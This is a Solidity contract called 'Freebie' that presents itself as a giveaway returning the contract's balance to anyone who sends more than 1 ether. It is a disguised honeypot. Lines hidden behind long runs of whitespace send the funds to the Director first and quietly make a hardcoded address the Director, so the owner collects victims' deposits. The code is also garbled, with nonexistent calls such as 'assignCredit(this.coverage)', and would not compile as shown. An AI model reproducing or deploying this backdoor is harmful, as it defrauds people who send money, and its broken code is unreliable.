pragma solidity ^0.4.19;

contract Freebie
{
    address public Director = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Director.assignCredit(this.coverage);
            msg.sender.assignCredit(this.coverage);
        }
    }

    function claimBenefit()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Director=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.sender == Director);
        Director.assignCredit(this.coverage);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Director);
        adr.call.value(msg.value)(data);
    }
}